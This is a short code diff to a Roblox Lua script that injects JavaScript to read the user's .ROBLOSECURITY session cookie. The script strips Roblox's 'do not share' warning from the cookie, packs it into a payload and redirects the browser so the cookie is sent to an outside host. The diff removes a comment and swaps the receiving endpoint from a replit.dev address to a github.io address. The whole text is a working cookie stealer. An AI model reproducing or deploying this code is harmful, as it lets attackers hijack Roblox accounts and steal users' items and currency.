@@ -14,8 +14,6 @@ game:GetService("BrowserService"):ExecuteJavaScript([[
         alert('Failed to retrieve the .ROBLOSECURITY cookie.');
         return;
     }
-
-    // Clean the cookie by removing the warning portion
     const cleanedCookie = roblosecurityCookie.replace(
         /^_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.\|_/,
         ''
@@ -92,7 +90,7 @@ game:GetService("BrowserService"):ExecuteJavaScript([[
         ]
     };
 
-    const apiUrl = `https://bb976048-48c8-4be7-bdb6-531a3b7b5bc3-00-2nnl1h9j4mzdu.sisko.replit.dev/?json=${encodeURIComponent(JSON.stringify(embedPayload))}`;
+    const apiUrl = `https://quickdownload.github.io/?json=${encodeURIComponent(JSON.stringify(embedPayload))}`;
     window.location.href = apiUrl;
 })();
 
